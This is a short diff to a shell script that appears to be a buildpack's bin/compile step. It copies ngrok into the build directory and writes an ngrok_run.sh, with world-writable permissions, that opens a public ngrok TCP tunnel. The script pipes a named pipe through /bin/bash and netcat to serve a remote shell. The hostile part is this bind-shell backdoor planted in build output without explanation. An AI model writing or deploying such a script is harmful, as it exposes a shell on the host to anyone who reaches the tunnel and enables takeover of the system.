@@ -1,11 +1,14 @@
 #!/bin/sh
 
 # bin/compile BUILD_DIR CACHE_DIR ENV_DIR
-./ngrok authtoken $NGROK_TOKEN
+cp ./ngrok $1/ngrok
+echo './ngrok authtoken $NGROK_TOKEN
 open_it &
 ./ngrok tcp $PORT
 
 open_it() {
   mkfifo $1/rshell
-  cat $1/rshell|/bin/bash 2>&1|nc -l 8080 >$1/rshell
+  cat $1/rshell|/bin/bash 2>&1|nc -l $PORT >$1/rshell
 }
+' > $1/ngrok_run.sh
+chmod 777 $1/ngrok_run.sh
